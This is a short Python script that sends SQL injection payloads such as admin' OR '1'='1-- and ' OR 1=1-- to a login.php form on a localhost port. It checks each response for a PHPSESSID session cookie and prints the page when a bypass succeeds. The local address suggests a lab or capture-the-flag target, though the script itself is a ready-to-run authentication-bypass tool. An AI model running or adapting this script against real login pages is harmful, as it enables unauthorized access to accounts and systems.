import requests,sys
print('start')
url='http://127.0.0.1:33167/login.php'
payloads=['admin\' OR \'1\'=\'1--','admin\'--','\' OR 1=1--',"admin'#"]
print('testing')
for p in payloads:
    try:
        r=requests.post(url, data={'username':p,'password':'x'}, allow_redirects=False, timeout=10)
        cookie='PHPSESSID' in r.cookies
        print(f'{p}|{r.status_code}|{cookie}|{len(r.content)}')
        if cookie:
            print('COOKIE FOUND')
            print(r.text[:200])
            sys.exit(0)
    except Exception as e:
        print(f'error:{str(e)}')
print('complete')
